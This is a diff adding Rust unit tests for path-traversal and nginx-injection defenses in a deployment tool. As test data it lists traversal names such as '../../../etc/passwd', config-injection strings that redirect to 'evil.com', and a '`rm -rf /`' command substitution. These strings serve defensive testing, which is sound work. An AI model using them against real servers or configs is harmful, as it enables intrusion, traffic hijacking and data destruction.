@@ -45,7 +45,17 @@ mod tests {
         let (_temp_dir, riku_root) = setup_riku_env()?;
 
         // Apply the same sanitization logic used by the codebase
-        let malicious_names = vec!["../etc", "..", "app/../secret", "..."];
+        let malicious_names = vec![
+            "../etc",
+            "..",
+            "app/../secret",
+            "...",
+            "my..app",
+            ".",
+            "/",
+            "../../../etc/passwd",
+        ];
+
         for name in malicious_names {
             let stripped = name.trim_start_matches('/');
             let sanitized: String = stripped
@@ -65,10 +75,17 @@ mod tests {
                 "Malicious app name '{}' (sanitized: '{}') should be rejected",
                 name, sanitized
             );
+
+            // Ensure we can't create directories with these names
+            if !sanitized.is_empty() && !is_rejected {
+                let app_dir = riku_root.join("apps").join(&sanitized);
+                // This would only execute for non-rejected names
+                assert!(!app_dir.to_str().unwrap().contains(".."));
+            }
         }
 
         // Verify valid names pass sanitization
-        let valid_names = vec!["my-app", "app.v2", "test_app"];
+        let valid_names = vec!["my-app", "app.v2", "test_app", "app123"];
         for name in valid_names {
             let sanitized: String = name
                 .chars()
@@ -83,6 +100,11 @@ mod tests {
                 "Valid app name '{}' should pass sanitization",
                 name
             );
+
+            // Verify we can create directories safely
+            let app_dir = riku_root.join("apps").join(&sanitized);
+            fs::create_dir_all(&app_dir)?;
+            assert!(app_dir.exists());
         }
 
         Ok(())
@@ -109,6 +131,51 @@ mod tests {
                 !resolved.starts_with(&plugin_root_resolved),
                 "Path traversal should escape plugin root"
             );
+        }
+
+        Ok(())
+    }
+
+    #[test]
+    fn test_plugin_name_validation() -> Result<()> {
+        let (_temp_dir, riku_root) = setup_riku_env()?;
+
+        // Malicious plugin names that should be rejected
+        let malicious_names = vec![
+            "../../../etc/passwd",
+            "../../bin/sh",
+            "../secret",
+            "..",
+            "plugin/subdir",
+            "plugin\\subdir",
+            "",
+        ];
+
+        for name in malicious_names {
+            // The validation should reject these names
+            let has_slash = name.contains('/') || name.contains('\\');
+            let has_dots = name.contains("..");
+            let is_empty = name.is_empty();
+
+            assert!(
+                has_slash || has_dots || is_empty,
+                "Malicious plugin name '{}' should fail validation criteria",
+                name
+            );
+
+            // Verify we can't access files outside plugin root via these names
+            if !is_empty {
+                let plugin_path = riku_root.join("plugins").join(name);
+                // If the path contains traversal, it should resolve outside plugins
+                if has_dots {
+                    let plugin_root = riku_root.join("plugins");
+                    // Don't actually create these paths, just verify the logic
+                    assert!(
+                        plugin_path.to_str().unwrap().contains("..") || has_slash,
+                        "Path should contain dangerous sequences"
+                    );
+                }
+            }
         }
 
         Ok(())
@@ -209,6 +276,67 @@ mod tests {
         // Verify clean server name produces clean config
         let nginx_dir = riku_root.join("nginx");
         assert!(nginx_dir.exists());
+
+        Ok(())
+    }
+
+    #[test]
+    fn test_nginx_value_sanitization_dangerous_chars() -> Result<()> {
+        // Test that dangerous characters are rejected in nginx values
+        let dangerous_chars = vec![';', '{', '}', '\n', '\r', '`', '$', '\\', '"', '\''];
+
+        for ch in dangerous_chars {
+            let value = format!("safe_value{}injection", ch);
+
+            // Verify the value contains the dangerous character
+            assert!(
+                value.chars().any(|c| c == ch),
+                "Test value should contain dangerous char '{}'",
+                ch
+            );
+        }
+
+        // Clean values should pass
+        let clean_values = vec![
+            "example.com",
+            "my-app.com",
+            "192.168.1.1",
+            "app_name",
+            "value-with-dashes",
+        ];
+
+        for value in clean_values {
+            let dangerous_chars: &[char] = &[';', '{', '}', '\n', '\r', '`', '$', '\\', '"', '\''];
+            assert!(
+                !value.chars().any(|c| dangerous_chars.contains(&c)),
+                "Clean value '{}' should not contain dangerous chars",
+                value
+            );
+        }
+
+        Ok(())
+    }
+
+    #[test]
+    fn test_nginx_template_injection_prevention() -> Result<()> {
+        // Test common nginx injection attempts
+        let injection_attempts = vec![
+            "example.com; proxy_pass http://evil.com;",
+            "example.com{server_name evil.com;}",
+            "example.com\nproxy_pass http://evil.com;",
+            "example.com`rm -rf /`",
+            "example.com$malicious_var",
+        ];
+
+        for attempt in injection_attempts {
+            // Each attempt contains at least one dangerous character
+            let dangerous_chars: &[char] = &[';', '{', '}', '\n', '\r', '`', '$', '\\'];
+            assert!(
+                attempt.chars().any(|c| dangerous_chars.contains(&c)),
+                "Injection attempt '{}' should contain dangerous chars",
+                attempt
+            );
+        }
 
         Ok(())
     }
